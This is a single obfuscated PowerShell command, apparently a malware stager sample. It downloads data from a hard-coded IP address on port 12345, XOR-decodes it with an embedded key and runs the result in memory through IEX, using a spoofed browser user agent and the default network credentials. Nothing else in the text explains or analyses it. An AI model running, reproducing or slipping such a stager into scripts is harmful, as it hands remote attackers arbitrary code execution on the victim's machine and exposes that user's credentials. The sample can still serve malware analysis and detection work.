
$WC=NEW-OBjEcT SySTeM.NET.WEbCLIeNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HEaDeRS.Add('User-Agent',$u);$wC.PrOXy = [SYsTeM.NET.WebREqueST]::DEfaultWEBProXY;$wc.PROXy.CreDeNtIALS = [SYStEm.NeT.CreDenTIalCACHE]::DefAULtNEtwORkCrEDentiaLs;$K='8e791a5a6e2632b6f3077e9ff1eb6e7b';$I=0;[cHaR[]]$b=([CHAR[]]($Wc.DownLOADSTRInG("http://187.177.151.80:12345/index.asp")))|%{$_-BXor$K[$i++%$k.LenGtH]};IEX ($b-JOIN'')

